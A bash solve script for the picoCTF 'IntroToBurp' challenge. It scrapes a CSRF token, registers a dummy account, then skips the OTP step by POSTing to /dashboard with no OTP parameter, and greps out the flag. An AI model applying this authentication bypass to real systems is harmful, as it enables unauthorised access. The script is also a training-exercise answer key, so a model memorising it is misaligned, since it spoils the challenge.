#!/bin/bash
# IntroToBurp - Solve Script
# Register then bypass OTP by sending empty POST to /dashboard

HOST="http://titan.picoctf.net:57309"

# Step 1: GET registration page, extract CSRF token
response=$(curl -sv -c /tmp/burp_cookies.txt -b /tmp/burp_cookies.txt "$HOST/" 2>&1)
csrf=$(echo "$response" | grep -oP 'csrf_token.*?value="\K[^"]+')

# Step 2: Submit registration
curl -svL -c /tmp/burp_cookies.txt -b /tmp/burp_cookies.txt \
  "$HOST/" \
  -d "csrf_token=$csrf&full_name=hacker&username=hacker1&phone_number=555-0000&city=NYC&password=hack123&submit=Register" 2>&1 > /dev/null

# Step 3: POST to /dashboard with NO otp parameter to bypass
curl -sv -c /tmp/burp_cookies.txt -b /tmp/burp_cookies.txt \
  "$HOST/dashboard" -X POST 2>&1 | grep -oP 'picoCTF\{[^}]+\}'
